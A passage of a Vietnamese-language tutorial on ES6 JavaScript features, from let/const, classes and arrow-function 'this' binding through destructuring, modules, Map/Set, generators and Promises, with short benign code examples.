[let](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let), [const](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const)\nES6 giới thiệu 2 từ khóa mới là `let` và `const` dùng để khai báo biến, trước đây chỉ có `var`.\n\n### Khác với [`var`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/var)\nCác biến được khai báo với `var` có phạm vi `function scope`, còn với `let`, `const` thì nó phạm vi `block scope`\n- `function scope`: Biến được khai báo dùng được trong toàn bộ function\n    ```js\n    function usingVar() {\n        let x = 1;\n        if (true) {\n            var y = 2;\n            console.log(x); // 1\n        }\n\n        console.log(y); // 2\n    }\n    ```\n- `block scope`: Biến được khai báo chỉ sử dụng được trong block {} nơi mà nó được khai báo\n    ```js\n    function usingLet() {\n        let x = 1;\n        if (true) {\n            let y = 2;\n            console.log(x); // 1\n        }\n\n        console.log(y); // Error: y is not defined\n    }\n    ```\n    Hoặc đối với biến trong vòng for:\n    ```js\n    for (let i = 0; i < 5; ++i) {\n        console.log(i); // OK\n    }\n\n    console.log(i); // Error: y is not defined\n    ```\n\n### let vs const\n- `let`: biến đã khai báo có thể được gán lại\n    ```js\n    let letVar = 'My old name';\n    if (true) {\n        letVar = 'I can have new name';\n    }\n    ```\n- `const`: biến đã khai báo không thể được gán lại\n    ```js\n    const constVar = 'Only god can change me';\n    if (true) {\n        constVar = 'Don\\'t try to change me'; // Error: invalid assignment\n    }\n    ```\n    Tuy nhiên nếu const là object thì giá trị của object vẫn có thể bị thay đổi. Chỉ *không thể bị gán thành object khác* mà thôi.\n    ```js\n    const myObject = {\n        id: 1,\n        name: 'Can be changed'\n    };\n    myObject.name = 'New name'; // OK\n    myObject = null; // Error\n    ```\n\nTừ đây trở đi chúng ta sẽ chủ yếu dùng `let` và `const`.\n\n## [Template strings](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)\nES6 giới thiệu thêm việc khai báo string bằng ký tự \\` (backtick), bổ sung cho `'` và `"`.\n\nDùng backtick ta có thể khai báo multiline string:\n```js\nconst multiline = `Rose is #f00\nViolet is #00f\nPeople often use word\nBut I will use hex code for you!\n`;\n```\nThay cho trước đây:\n```js\nconst multiline = 'This is first line'\n    + 'This is second line';\n```\n\nCó thể dùng biến hoặc biểu thức JS trong string (String interpolation):\n```js\nconst name = 'ES6';\nfunction thanks() {\n    return 'Thank you!';\n};\nconst obj = {\n    ask() {\n        return 'And you?';\n    }\n};\nconst superPowerString = `How are you, ${name}? - I'm fine. ${thanks()} ${obj.ask()}`;\n```\n\n## [Class](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes)\nCú pháp khá giống với các ngôn ngữ class based OOP như PHP hoặc Java.\n\nClass trong ES6 support kế thừa, super (parent) calls, instance method, static methods and constructor.\n\n### Constructor\n```js\nclass Animal {\n    constructor(name) {\n        this.name = name;\n    }\n}\n\nlet dog = new Animal('Golden Retriever');\nconsole.log(dog.name);\n```\n\n### Instance method\n```js\nclass Animal {\n    constructor(name) {\n        this.name = name;\n    }\n\n    introduce() {\n        console.log(`My name is ${this.name}`);\n    }\n}\n\nlet dog = new Animal('Golden Retriever');\nconsole.log(dog.introduce());\n```\n\n### Static method\n```js\nclass Animal {\n    constructor(name) {\n        this.name = name;\n    }\n\n    static species() {\n        return 1300000;\n    }\n}\n\nconsole.log(Animal.species());\n```\n\n### Getter & Setter\nES6 class support define các getter, setter cho các property của object. Cho phép chúng ta custom logic khi đọc/ghi giá trị của property, chẳng hạn validate, biến đổi giá trị...\n```js\nclass Animal {\n    constructor(name) {\n        this._name = name;\n    }\n\n    get name() {\n        return this._name.toUpperCase();\n    }\n\n    set name(name) {\n        this._name = name.toLowerCase();\n    }\n}\n\nlet dog = new Animal('Golden Retriever');\nconsole.log(dog.name);\n\ndog.name = 'Husky';\nconsole.log(dog.name);\n```\nNhìn vào class có thể nhầm lẫn `name()` là một instance method, nhưng ở đây nó là method đặc biệt, chúng ta không thể gọi trực tiếp method này mà từ tên method => tên property.\n\n```js\nlet dog = new Animal('Golden Retriever');\ndog.name(); // ERROR\ndog.name; // OK\n```\n\n### Inheritance\n```js\nclass Animal {\n    constructor(name) {\n        this._name = name;\n    }\n\n    get name() {\n        return this._name.toUpperCase();\n    }\n\n    set name(name) {\n        this._name = name.toLowerCase();\n    }\n\n    introduce() {\n        console.log(`My name is ${this.name}`);\n    }\n\n    static species() {\n        return 1300000;\n    }\n}\n\nclass Cat extends Animal {\n    constructor(name, isReal) {\n        super(name);\n\n        this.isReal = isReal;\n    }\n\n    static species() {\n        return NaN;\n    }\n}\n\nlet tom = new Cat('Tom', false);\nconsole.log(tom);\ntom.introduce();\nconsole.log(Cat.species());\n```\n\n### [Class fields](https://github.com/tc39/proposal-class-fields)\nES vẫn chưa chính thức support việc khai báo private/public property của object class, tính năng này vẫn đang còn được thảo luận ([Proposal Stage 3](https://github.com/tc39/proposal-class-fields)).\n```js\nclass Rectangle {\n    constructor(height, width) {\n        this.height = height;\n        this.width = width;\n    }\n}\n\n// Static field\nRectangle.staticWidth = 20;\n```\nVới proposal này ta có thể viết khai báo instance field và static field như sau:\n```js\nclass Rectangle {\n    height = 0;\n    width;\n\n    static staticWidth = 20;\n\n    constructor(height, width) {\n        this.height = height;\n        this.width = width;\n    }\n}\n```\n\nNếu sử dụng Create React App thì tính năng này cũng đã được enable, chúng ta có thể sử dụng nó:\n```jsx\nclass Button extends React.Component {\n    static defaultProps = {\n        type: 'primary',\n    }\n\n    static propTypes = {\n        children: PropTypes.string,\n    };\n\n    static contextType = MyContext;\n}\n```\n\n## [Enhanced Object Properties](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer)\nES6 cung cấp thêm một số cú pháp giúp cho việc khai báo object dễ dàng hơn.\n\n### Property Shorthand\nKhai báo property và value ngắn gọn:\n```js\nconst name = 'Killua';\nconst type = 'Transmuter';\n\nconst killa = { name, type };\n```\n\nTương đương với cách cũ:\n```js\nconst name = 'Killua';\nconst type = 'Transmuter';\n\nconst killa = { name: name, type: type };\n```\n\n### Computed Property Names\nProperty của object có thể là dynamic:\n```js\nconst event = 'click';\n\nconst handlers = {\n    [`on${event}`]: true,\n};\n// {onclick: true}\n```\n\nNếu viết theo cách cũ:\n```js\nconst event = 'click';\n\nconst handlers = {};\nhandlers[`on${event}`] = true;\n```\n\n### Method Properties\n```js\nconst command = {\n    play() {\n        //\n    },\n    pause() {\n        ///\n    },\n    seek(time) {\n        //\n    },\n};\n```\n\nVới cách viết cũ:\n```js\nconst command = {\n    play: function () {\n        //\n    },\n    pause: function () {\n        ///\n    },\n    seek: function (time) {\n        //\n    },\n};\n```\n\n## [Arrow function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)\nCú pháp viết function ngắn gọn sử dụ dấu `=>` hay còn gọi là **fat arrow**:\n\n```js\nconst hello = () => {\n    console.log('Hello ES6 "fat arrow" function');\n}\n```\nVí dụ trên tương đương với cách viết cũ như sau:\n```js\nfunction hello() {\n    console.log('Hello ES6 "fat arrow" function');\n}\n```\n\n### Tham số trong arrow function\nKhi cần truyền tham số:\n```js\nconst hello = (name, year) => {\n    console.log(`Hello ${name} from the year ${year} of future!`)\n}\n```\nNếu chỉ có 1 tham số thì có thể lược bỏ dấu ngoặc đơn:\n```js\nconst hello = name => {\n    console.log(`Hello ${name}!`)\n}\n```\n\n### Expression bodies (Implicit returns)\nKhông có curly braces => Implicit return\n```js\nconst add = (x, y) => x + y;\nconsole.log(add(1, 2)); // 3\n\nconst products = [\n    {id: 1, name: 'Ubuntu'},\n    {id: 2, name: 'CentOS'},\n    {id: 3, name: 'openSUSE'},\n];\nconst productIds = products.map(product => product.id);\n```\n\nNếu muốn return object thì sao? => Wrap object bên trong cặp ngoặc `()`:\n```js\nconst makeCoffee = () => ({\n    type: 'Gi cung duoc',\n});\nconsole.log(makeCoffee()); // { type: "Gi cung duoc" }\n\nthis.setState(prevState => ({\n    count: prevState.count++\n}));\n```\n\n### Statement Bodies\nNếu viết theo statement bodies:\n```js\nconst add = (x, y) => {\n    return x + y;\n}\n\nconst makeCoffee = () => {\n    return {\n        type: 'Gi cung duoc',\n    };\n};\n\nthis.setState(prevState => {\n    return {\n        count: prevState.count++\n    };\n}\n```\n\n### Lexical this\nKhoan nói về khái niệm `lexical this`.\n\n##### `this` là gì?\nGiống như trong các ngôn ngữ lập trình khác như PHP, Java thì `this` được sử dụng như một đại từ nhân xưng để thay thế cho đối tượng mà chúng ta đang sử dụng.\n\nVí dụ:\n```php\nclass Person {\n    private $name;\n\n    public function __construct($name)\n    {\n        $this->name = $name;\n    }\n\n    public function hello()\n    {\n        return "My name is {$this->name}.";\n    }\n}\n\n$es = new Person('ES');\n$es->hello(); // "My name is ES."\n```\n\n`this` chỉ tồn tại và được sử dụng bên trong object (hay còn gọi là: instance của một class). Thật đơn giản và dễ hiểu!!!\n\nNhưng ở đây Javascript không như vậy. Điều khác biệt là:\n- Function trong JS cũng là một object và do đó nó có `this`\n- `this` được xác định vào lúc function được gọi, dựa theo ngữ cảnh: *ai* (*đối tượng nào*) gọi function đó và gọi theo cách nào, chứ không phải dựa theo nơi mà nó được sử dụng (bên trong method của class)\n\nVậy trong JS có những cách gọi function nào? Ví dụ ta có function sau:\n```js\nfunction whoami() {\n    console.log('You are ', this);\n}\n```\n- Global function call:\n    ```js\n    whoami(); // You are Window\n    ```\n    > => `this` được xác định là global object, tương đương với đối tượng `window` trên trình duyệt hoặc `global` trong NodeJS.\n\n- Method call:\n    ```js\n    const obj = {\n        name: 'Normal Person',\n        whoami: whoami,\n    };\n\n    obj.whoami(); // "You are " Object { name: "Normal Person" }\n    ```\n    > => `this` ở đây là đối tượng `obj`, do method `whoami` được `obj` gọi\n\n- Thông qua `apply()` hoặc `call()`:\n    Nhớ lại, trong JS function cũng là một object và object này có một số method mặc định. Trong đó có `apply` và `call`, mục đích của 2 method này giống nhau, chỉ khác trong cách truyền tham số:\n    ```js\n    function.apply(thisArg, [argsArray])\n    //\n    function.call(thisArg, arg1, arg2, ...)\n    ```\n    Và mục đích ở đây là: set giá trị của `this` bên trong function, truyền tham số (nếu có) và gọi function. Ví dụ:\n    ```js\n    const harry = {\n        name: 'Harry Potter',\n    };\n\n    const ron = {\n        name: 'Ron Weasley',\n    };\n\n    whoami.call(harry); // "You are " Object { name: "Harry Potter" }\n\n    whoami.apply(ron); // "You are " Object { name: "Ron Weasley" }\n    ```\n    > => `this` ở đây là giá trị được chỉ định tường minh (explicit binding).\n\n    Ví dụ sử dụng khi function có nhiều tham số:\n    ```js\n    function sendMessage(to, message) {\n        console.log(`From: ${this.name}, To: ${to.name} ==> ${message}`);\n    }\n\n    const harry = {\n        name: 'Harry Potter',\n    };\n\n    const ron = {\n        name: 'Ron Weasley',\n    };\n\n    sendMessage.call(harry, ron, 'Buzzz!!!'); // "From: Harry Potter, To: Ron Weasley ==> Buzzz!!!"\n\n    sendMessage.apply(harry, [ron, 'Buzzz!!!']); // "From: Harry Potter, To: Ron Weasley ==> Buzzz!!!"\n    ```\n\n    Ngoài ra khi làm việc với React, chúng ta có thể hay dùng đến method `bind()`. Mục đích của method này đó là: copy function tạo ra function mới và set giá trị của `this` bên trong function mới tạo.\n    ```js\n    function speak() {\n        console.log(this.voice);\n    }\n\n    const cat = {\n        voice: 'Meow',\n    };\n    const catSpeak = speak.bind(cat);\n    catSpeak();\n\n    const dog = {\n        voice: 'Gogo',\n    };\n    const dogSpeak = speak.bind(dog);\n    dogSpeak();\n    ```\n- Callback, event handler:\n    Ở đây, chúng ta không trực tiếp gọi function mà là khai báo function và đưa cho đối tượng khác sử dụng.\n    ```js\n    const pikachu = {\n        name: 'Pikachu',\n        type: 'Electric',\n        showDetail: function () {\n            console.log(`This is ${this.name} from ${this.type} World`);\n        }\n    }\n\n    setTimeout(pikachu.showDetail, 5000);\n    ```\n    Chú ý là khi viết `pikachu.showDetail` tức là chúng ta đang coi nó như là một object, chứ chưa gọi method `pikachu.showDetail()`.\n\n    `pikachu.showDetail` ở đây được gọi là callback cho hàm `setTimeout`, tức là khi cần (ví dụ, sau khi đếm ngược hết 5 giây) thì `setTimeout` sẽ gọi hàm `pikachu.showDetail` (Hiểu từ theo cách tự nhiên: anh đưa cho em *số điện thoại này* khi nào cần em *gọi lại* (callback) cho anh nhé!!! :D).\n\n    Thế nhưng đối tượng gọi hàm `showDetail` ở đây không phải là `pikachu` mà là function `setTimeout`. Vậy chắc bạn cũng đoán được kết quả rồi.\n\n    Một ví dụ khác:\n    ```js\n    const sampleSet = {\n        sets: [],\n        addMany: function (values) {\n            values.forEach(function (value) {\n                if (this.sets.indexOf(value) === -1) {\n                    this.sets.push(value);\n                }\n            });\n        }\n    }\n    sampleSet.addMany([1, 2, 3]);\n    sampleSet.addMany([2, 5, 4]);\n    ```\n    Ở đây chúng ta truyền callback cho method `forEach` là một anonymous function (hàm không tên).\n\n    Ví dụ tương tự với event handler:\n    ```html\n    <button id="js-btn-show-pikachu">Show Pikachu</button>\n\n    <script>\n    const pikachu = {\n        name: 'Pikachu',\n        type: 'Electric',\n        showDetail: function () {\n            console.log(`This is ${this.name} from ${this.type} World`);\n        }\n    }\n\n    document.querySelector('#js-btn-show-pikachu').addEventListener('click', pikachu.showDetail);\n    // $('#js-btn-show-pikachu').on('click', pikachu.showDetail);\n    </script>\n    ```\n    Giống như trong React chúng ta hay viết:\n    ```jsx\n    class PikachuButton extends React.Component {\n        constructor() {\n            super();\n\n            this.name  = 'Pikachu';\n            this.type  = 'Electric';\n        }\n\n        showDetail() {\n            console.log('this is:', this);\n        }\n\n        render() {\n            return (\n                <button onClick={this.showDetail}>Click me (onegai)</button>\n            );\n        }\n    }\n    ```\n    Tương tự với ví dụ `setTimeout`, khi có sự kiện `click` thì đối tượng gọi hàm `showDetail` ở đây sẽ là `button` và đến đây thì ai cũng biết kết quả là gì rồi.\n\n    Để có kết quả như ý muốn, ta có thể sửa lại như sau:\n    ```js\n    const showPikachuCallback = pikachu.showDetail.bind(pikachu);\n    setTimeout(showPikachuCallback, 5000);\n\n    $('#js-btn-show-pikachu').on('click', showPikachuCallback);\n    ```\n\n    ```js\n    const sampleSet = {\n        sets: [],\n        addMany: function (values) {\n            const self = this;\n            values.forEach(function (value) {\n                if (self.sets.indexOf(value) === -1) {\n                    self.sets.push(value);\n                }\n            });\n        }\n    }\n    sampleSet.addMany([1, 2, 3]);\n    sampleSet.addMany([2, 5, 4]);\n    ```\n\n    ```jsx\n    class PikachuButton extends React.Component {\n        constructor() {\n            super();\n\n            // ...\n\n            this.showDetail = this.showDetail.bind(this);\n        }\n\n        // ...\n\n        render() {\n            return (\n                <button onClick={this.showDetail}>Click me (onegai)</button>\n            );\n        }\n    }\n    ```\n    Xem thêm ví dụ về React => https://codesandbox.io/s/hardcore-johnson-h6eki\n\n#### `lexical this` là gì?\nKhác với function thông thường, arrow function không tự bind `this` và chúng ta cũng không dùng được các method `call()`, `apply()`, `bind()` để "set this" cho function.\n\n`this` trong arrow function được xác định dựa vào nơi mà nó được define (hoặc là global hoặc bên trong class hoặc bên trong function khác).\n\nThử thay function thông thường bằng arrow function trong các ví dụ trên:\n```js\nconst whoami = () => {\n    console.log('You are ', this);\n}\n\nconst harry = {\n    name: 'Harry Potter',\n};\n\nconst ron = {\n    name: 'Ron Weasley',\n};\n\nwhoami.call(harry); // You are Window\n\nwhoami.apply(ron); // You are Window\n```\n`call()`, `apply()`, `bind()` đều không áp dụng được cho arrow function. Ở ví dụ trên, function `whoami` được define global nên `this` bên trong function này sẽ được gắn với global object (window).\n\nCần phải chú ý khi dùng arrow function cho callback, event handler, object method:\n```js\ndocument.querySelector('#js-btn-show').addEventListener('click', () => {\n    console.log(this); // window!!!\n});\n\nconst pikachu = {\n    name: 'Pikachu',\n    type: 'Electric',\n    showDetail: () => {\n        console.log(this);\n    }\n}\npikachu.showDetail(); // window!!!\n```\n\nTuy vậy, arrow function là khá hữu ích khi dùng làm callback trong trường hợp này:\n```js\nconst sampleSet = {\n    sets: [],\n    addMany: function (values) {\n        values.forEach((value) => {\n            if (this.sets.indexOf(value) === -1) {\n                this.sets.push(value);\n            }\n        });\n    }\n}\nsampleSet.addMany([1, 2, 3]);\nsampleSet.addMany([2, 5, 4]);\n```\n\nHoặc event handler trong React class component:\n```jsx\nclass Button extends React.Component {\n    handleClick(event) {\n        console.log(event, this);\n        // this.setState()...\n    }\n\n    render() {\n        return (\n            <button onClick={(e) => this.handleClick(event)}>Click me (onegai)</button>\n        );\n    }\n}\n```\nVì arrow function được khai báo bên trong class, `this` tham chiếu đến chính đối tượng của class này, chứ không tự động bind theo ngữ cảnh lúc gọi nữa.\n\nHoặc sử dụng proposal class fields (đã được [include](https://facebook.github.io/create-react-app/docs/supported-browsers-features) trong Create React App):\n```jsx\nclass Button extends React.Component {\n    // This syntax ensures `this` is bound within handleClick.\n    // Warning: this is *experimental* syntax.\n    handleClick = () => {\n        console.log('this is:', this);\n    }\n\n    render() {\n        return (\n            <button onClick={this.handleClick}>\n                Click me\n            </button>\n        );\n    }\n}\n```\n\n## [Default parameters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters)\n```js\nfunction button(name, type = 'default') {\n    return `Render button with name ${name} and type ${type}`;\n}\n\nbutton('Add');\nbutton('Edit', 'warning');\n```\nNếu viết theo cách cũ:\n```js\nfunction button(name, type) {\n    if (type === undefined) {\n        type = 'default';\n    }\n\n    return `Render button with name ${name} and type ${type}`;\n}\n```\n\n## [Rest Parameter](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/rest_parameters)\nTrong variadic function (function có số lượng parameters không cố định) thì tập hợp các tham số còn lại của function có thể được nhóm vào một mảng duy nhất gọi là `rest parameter`:\n```js\nfunction variadicFunction(first, second, ...rest) {\n    console.log(first, second, rest);\n}\n\nvariadicFunction(); // undefined, undefined, []\nvariadicFunction(1, 2); // 1, 2, []\nvariadicFunction(1, 2, 3, 4); // 1, 2, [3, 4]\n```\n\n## [Spread Operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax)\nSpread operator `...` dùng để extract các phần tử của array (hoặc string) thành các tham số khi gọi function hoặc khi thêm vào array khác.\n\n### Function call\n```js\nfunction sum(x, y, z) {\n    return x + y + z;\n}\n\nconst numbers = [1, 2, 3];\n\nconsole.log(sum(...numbers));\n// Old ways:\nconsole.log(sum(numbers[0], numbers[1], numbers[2]));\nconsole.log(sum.apply(null, numbers));\n```\n\n### Array\n- Tạo array mới chứa array cũ\n    ```js\n    const parts = ['shoulders', 'knees'];\n    const lyrics = ['head', ...parts, 'and', 'toes'];\n    // ["head", "shoulders", "knees", "and", "toes"]\n    ```\n    Khi chưa có spread:\n    ```js\n    const parts = ['shoulders', 'knees'];\n    let lyrics = ['head'];\n        lyrics = lyrics.concat(parts).concat(['and', 'toes']);\n    ```\n- Copy array\n    ```js\n    const arr = [1, 2, 3];\n    const copiedArr = [...arr]; // like arr.slice()\n    copiedArr.push(4);\n\n    // copiedArr == [1, 2, 3, 4]\n    // arr == [1, 2, 3]\n    ```\n- Concat array\n    ```js\n    const arr1 = [0, 1, 2];\n    const arr2 = [3, 4, 5];\n    const newArr = [...arr1, ...arr2]; // newArr == [0, 1, 2, 3, 4, 5]\n    // newArr = arr1.concat(arr2);\n    ```\n- Unshift array\n    ```js\n    const arr1 = [0, 1, 2];\n    const arr2 = [3, 4, 5];\n    const newArr = [...arr2, ...arr1]; // newArr == [3, 4, 5, 0, 1, 2]\n    // Array.prototype.unshift.apply(arr1, arr2) // arr1 modified\n    ```\n\n## [Destructuring](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)\nExtract values của các phần tử trong mảng, property của object thành các biến.\n\n### Array destructuring\n```js\nconst foo = [1, 2, 3];\n\nconst [one, two, three] = foo;\nconsole.log(one); // 1\nconsole.log(two); // 2\nconsole.log(three); // 3\n```\nGán giá trị mặc cho biến nếu vượt quá độ dài của array:\n```js\nconst foo = [1, 2];\n\nconst [one, two, three = "default"] = foo;\n```\nSwap giá trị của 2 biến:\n```js\nlet a = 1;\nlet b = 2;\n\n[a, b] = [b, a];\n```\nBỏ qua phần tử nào đó trong array:\n```js\nconst arr = [1, 2, 3];\n\nconst [one, , three] = arr;\n```\nRest elements:\n```js\nconst arr = [1, 2, 3, 4];\n\nconst [one, two, ...rest] = arr;\n// 1, 2, [3, 4]\n```\n\n### Object destructuring\n```js\nconst o = {p: 42, q: true};\nconst {p, q} = o;\n```\nThay đổi tên biến:\n```js\nconst {p: foo, q: bar} = o;\n```\nGiá trị mặc định:\n```js\nconst {p, q, r = 'default'} = o;\n```\nKết hợp việc thay đổi tên biến và giá trị mặc định:\n```js\nconst {p: foo, q: bar = 'default bar', r: baz = 'default baz'} = o;\n```\nFunction parameter destructuring:\n```js\nfunction button({name, type = 'default'}) {\n    console.log(name, type);\n}\n\nbutton({name: 'Edit'});\n```\n\n## Modules\nTrong ES6, bạn có thể [`import`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) và [`export`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export) các chức năng từ các module giữa các file. Những chức năng này có thể là function, class, constant,... về cơ bản là mọi thứ bạn có thể gán vào một biến.\n\nNhững  module có thể là những file riêng biệt hoặc toàn bộ folder với một file index như là một `entry point`.\n\nCác câu lệnh `import` và `export` giúp bạn thực hiện code splitting, bạn viết code ra nhiều file, giúp cho việc sử dụng lại và maintain, thiết kế các module chức năng. Hơn nữa, nó giúp bạn suy nghĩ về tính đóng gói. Không phải mọi chức năng trong module cần export ra bên ngoài mà chỉ được dùng trong cùng file. Những chức năng được export giống như là public API của module, chỉ những chức năng được export có thể được sử dụng lại bên ngoài.\n\nCó hai cách `export`:\n- Export theo tên: **named export**\n- Export `default`\n\n### Named export\nVD: Export biến từ `file1.js` the kiểu **named export**:\n```js\nconst firstname = 'robin';\nconst lastname = 'wieruch';\nexport { firstname, lastname };\n```\nHoặc export từng biến:\n```js\nexport const firstname = 'robin';\nexport const lastname = 'wieruch';\n```\nVà sau đó import vào `file2.js`:\n```js\nimport { firstname, lastname } from './file1.js';\nconsole.log(firstname);\n// output: robin\n```\n\nBạn cũng có thể import tất cả biến được export từ file khác như là một object.\n\n`file2.js`:\n```js\nimport * as person from './file1.js';\nconsole.log(person.firstname);\n// output: robin\n```\n\nImport có thể có một alias, bạn có thể sử dụng nó trong trường hợp import 2 chức năng từ 2 module có cùng tên :\n`file2.js`:\n```js\nimport { firstname as foo } from './file1.js';\nconsole.log(foo);\n// output: robin\n```\n\n### Export default\nVới `default` export, bạn có thể sử dụng trong các trường hợp:\n- Export duy nhất một chức năng\n- Để làm nổi bật chức năng chính của module\n\nVí dụ\n`file1.js`:\n```js\nconst robin = {\n    firstname: 'robin',\n    lastname: 'wieruch',\n};\n\nexport default robin;\n```\n\nKhi import, bạn có thể bỏ qua dấu ngoặc cho việc import `default` export.\n\n`file2.js`:\n```js\nimport developer from './file1.js';\nconsole.log(developer);\n// output: { firstname: 'robin', lastname: 'wieruch' }\n```\nHơn nữa, tên import có thể khác với export default name.\n\nBạn cũng có thể kết hợp cả hai kiểu export:\n\n`file1.js`:\n```js\nconst firstname = 'robin';\nconst lastname = 'wieruch';\nconst person = {\n    firstname,\n    lastname,\n};\n\nexport {\n    firstname,\n    lastname,\n};\n\nexport default person;\n```\n\n`file2.js`:\n```js\nimport developer, { firstname, lastname } from './file1.js';\nconsole.log(developer);\n// output: { firstname: 'robin', lastname: 'wieruch' }\nconsole.log(firstname, lastname);\n// output: robin wieruch\n```\n\n## [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map), [Set](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set)\n### Kiểu dữ liệu `Map`\nTương tự như object dạng key-value, nhưng có những điểm khác biệt:\n- Key của object chỉ có thể là string, number hoặc [Symbol](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol), trong khi đó key của map có thể là bất cứ giá trị nào bao gồm cả function, object.\n    ```js\n    const myMap = new Map();\n\n    const keyString = 'a string';\n    const keyObj = {};\n    const keyFunc = function() {};\n\n    // setting the values\n    myMap.set(keyString, "value associated with 'a string'");\n    myMap.set(keyObj, 'value associated with keyObj');\n    myMap.set(keyFunc, 'value associated with keyFunc');\n\n    myMap.size; // 3\n    ```\n- Thứ tự insert của key trong Map được giữ nguyên khi lặp\n- Map có method `size()` để biết số lượng phần tử trong Map\n- Map là một iterable object nên có thể sử dụng trong `for..of`, `forEach`\n    ```js\n    const myMap = new Map();\n    myMap.set(0, 'zero');\n    myMap.set(1, 'one');\n    for (const [key, value] of myMap) {\n        console.log(key + ' = ' + value);\n    }\n    // 0 = zero\n    // 1 = one\n\n    myMap.forEach(function(value, key) {\n        console.log(key + ' = ' + value);\n    });\n    ```\n- Object có prototype nên nó sẽ có một số key mặc định\n- Map phù hợp hơn trong các kịch bản thêm, xóa key-value thường xuyên\n### Kiểu dữ liệu `Set`\nLà một tập hợp, gồm các phần tử có unique value.\n```js\nvar mySet = new Set();\n\nmySet.add(1); // Set [ 1 ]\nmySet.add(5); // Set [ 1, 5 ]\nmySet.add(5); // Set [ 1, 5 ]\n```\n\n## [for..of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)\nThêm 1 cú pháp để lặp các `iterable objects`: String, Array, Map, Set...\n```js\nlet iterable = [10, 20, 30];\n\nfor (let value of iterable) {\n  value += 1;\n  console.log(value);\n}\n\nfor (const value of iterable) {\n  console.log(value);\n}\n```\n\n## [Generators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*)\n- Là những function có thể tạm dừng và tiếp tục ở một thời điểm khác sau khi gọi\n    ```js\n    function* generator(i) {\n        yield i;\n        i = i + 5;\n        yield;\n        yield i + 10;\n        return 100;\n    }\n\n    var gen = generator(10);\n    console.log(gen.next()); // { value: 10, done: false }\n    console.log(gen); // Generator object\n    console.log(gen.next().value); // undefined\n    console.log(gen.next().value); // 25\n    console.log(gen.next().value); // 100\n    ```\n- Sử dụng từ khóa `function*` để khai báo một generator function\n- Sử dụng `yield` để tạm dừng function và trả về giá trị cho method `next()`\n- Giá trị trả về khi gọi một generator function đó là một `Generator Object`\n    + `Generator Object` có thể dùng trong vòng lặp `for..of`\n        ```js\n        function* foo() {\n            yield 1;\n            yield 2;\n            yield 3;\n            yield 4;\n            yield 5;\n            return 6; // Not include in for..of\n        }\n\n        for (const v of foo()) {\n            console.log(v);\n        }\n        // 1 2 3 4 5\n        ```\n        > Chú ý là `for..of` ignore giá trị `return 6`\n\n    + Hoặc gọi nhiều lần method `next()` resume function, chạy đến từng điểm đã `yield` trong function cho đến khi gặp return hoặc `yield` cuối cùng\n    + Method `next()` trả về object có dạng `{value: value, done: true/false}`, `value` là do yield hoặc `return` trả về và `done` để xác định generator đã kết thúc chưa\n\n## [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)\n- Hỗ trợ lập trình bất đồng bộ (asynchronous)\n- Promise là một object đại diện cho kết quả hoặc lỗi của một hoạt động bất đồng bộ\n- Thay vì truyền callback vào function, Promise object cho phép chúng ta attach callback và chaining:\n    Ví dụ truyền callback:\n    ```js\n    function successCallback(result) {\n        console.log("Data loaded: ", + result);\n    }\n\n    function failureCallback(error) {\n        console.log("Error loading data: " + error);\n    }\n\n    loadData(options, successCallback, failureCallback);\n    ```\n    Sử dụng promise:\n    ```js\n    loadData(options).then(successCallback, failureCallback);\n\n    // const promise = loadData(options);\n    // promise.then(successCallback, failureCallback);\n    ```\n- Then chaining\n    Method `then()` trả về một promise mới, vì thế có thể chaining `then()` nhiều lần.\n    ```js\n    doSomething()\n        .then(function(result) {\n            return doSomethingElse(result);\n        })\n        .then(function(newResult) {\n            return doThirdThing(newResult);\n        })\n        .then(function(finalResult) {\n            console.log('Got the final result: ' + finalResult);\n        })\n        .catch(failureCallback);\n    ```\n    > Cần chú ý return value ở `then()` thì `then()` sau mới có result\n    > Promise chaining dừng nếu có exception, khi đó các `then()` ở sau bị bỏ qua và chỉ có `catch` handlers được gọi\n\n    Nếu truyền callback cũ thì có dẫn đến callback hell như thế này:\n    ```js\n    doSomething(function(result) {\n        doSomethingElse(result, function(newResult) {\n            doThirdThing(newResult, function(finalResult) {\n                console.log('Got the final result: ' + finalResult);\n            }, failureCallback);\n        }, failureCallback);\n    }, failureCallback);\n    ```\n    Ví dụ với fetch:\n    ```js\n    fetch(url, options)\n        .then(response => response.json())\n        .then(data => console.log(data))\n    ```\n    => `then()` thứ nhất json decode response string, `then()` thứ hai lấy data từ promise của `then()` thứ nhất.\n\n- Chạy song song nhiều async function\n    ```js\n    Promise.all([func1(), func2(), func3()])\n        .then(([result1, result2, result3]) => { /* use result1, result2 and result3 */ });\n\n    const wait = second => new Promise(resolve => setTimeout(() => resolve(second), 1000 * second));\n    const multipleWaits = seconds => {\n        let promises = seconds.map(second => wait(second));\n\n        return Promise.all(promises);\n    }\n\n    multipleWaits([1, 2, 3]).then(results => console.log(results)); // done in 3 seconds\n    ```\n- Sai lầm thường gặp\n    + Không return value\n    ```js\n    doSomething()\n        .then(function(result) {\n            doSomethingElse(result); // No return\n        })\n        .then((newResult) => console.log(newResult)); // undefined\n    ```\n    + Nesting promise. Vì `then()` return promise, không cần phải chaing bên trong callback\n    ```js\n    // Bad\n    doSomethingCritical()\n        .then(result => doSomethingOptional()\n            .then(optionalResult => 